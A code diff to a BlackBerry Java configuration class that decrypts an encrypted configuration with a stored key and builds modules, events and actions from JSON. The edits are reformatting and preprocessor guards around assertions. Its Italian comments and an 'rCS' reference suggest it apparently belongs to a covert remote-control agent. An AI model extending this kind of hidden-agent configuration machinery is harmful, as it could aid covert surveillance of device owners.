@@ -1,3 +1,4 @@
+//#preprocess
 package blackberry.config;
 
 import rpc.json.me.JSONArray;
@@ -8,6 +9,7 @@ import blackberry.GeneralException;
 import blackberry.Status;
 import blackberry.action.Action;
 import blackberry.crypto.EncryptionPKCS5;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
@@ -15,7 +17,6 @@ import blackberry.manager.ActionManager;
 import blackberry.manager.EventManager;
 import blackberry.manager.ModuleManager;
 import blackberry.module.BaseModule;
-import blackberry.debug.Check;
 
 public class Configuration {
     //#ifdef DEBUG
@@ -146,7 +147,8 @@ public class Configuration {
 
             if (instantiate) {
                 final ConfModule conf = new ConfModule(moduleType, params);
-                BaseModule module = ModuleManager.getInstance().makeModule(conf);
+                BaseModule module = ModuleManager.getInstance()
+                        .makeModule(conf);
             }
         }
     }
@@ -157,14 +159,16 @@ public class Configuration {
         }
 
         public void call(int eventId, JSONObject jmodule) throws JSONException {
-
+            //#ifdef DBC
             Check.requires(jmodule != null,
                     " (call) Assert failed, null jmodule");
+            //#endif
 
             String eventType = jmodule.getString("event");
-
+            //#ifdef DBC
             Check.asserts(eventType != null,
                     " (call) Assert failed, null eventType");
+            //#endif
 
             if (jmodule.has("type")) {
                 eventType += " " + jmodule.getString("type");
@@ -214,9 +218,10 @@ public class Configuration {
 
                 }
             }
-
+            //#ifdef DBC
             Check.ensures(a.getSubActionsNum() == subNum,
                     "inconsistent subaction number"); //$NON-NLS-1$
+            //#endif
 
             if (instantiate) {
                 ActionManager.getInstance().add(a);
@@ -292,21 +297,23 @@ public class Configuration {
      * @throws GeneralException
      *             the rCS exception
      */
-    private String decryptConfiguration(final byte[] rawConf, int len, int offset) {
+    private String decryptConfiguration(final byte[] rawConf, int len,
+            int offset) {
         /**
          * Struttura del file di configurazione
          * 
          * |DWORD|DATA.....................|CRC| |---Skip----|-Len-|
          * 
-         * La prima DWORD contiene la
-         * lunghezza del blocco di dati (inclusa la stessa Len) CRC e' il CRC
-         * (cifrato) dei dati in chiaro, inclusa la DWORD Len
+         * La prima DWORD contiene la lunghezza del blocco di dati (inclusa la
+         * stessa Len) CRC e' il CRC (cifrato) dei dati in chiaro, inclusa la
+         * DWORD Len
          */
 
         try {
             EncryptionPKCS5 crypto = new EncryptionPKCS5(Keys.getInstance()
                     .getConfKey());
-            final byte[] clearConf = crypto.decryptDataIntegrity(rawConf,len,offset);
+            final byte[] clearConf = crypto.decryptDataIntegrity(rawConf, len,
+                    offset);
 
             String json = new String(clearConf);
 
@@ -347,7 +354,7 @@ public class Configuration {
     }
 
     public boolean isDecrypted() {
-        return jsonResource!=null;
+        return jsonResource != null;
     }
 
 }
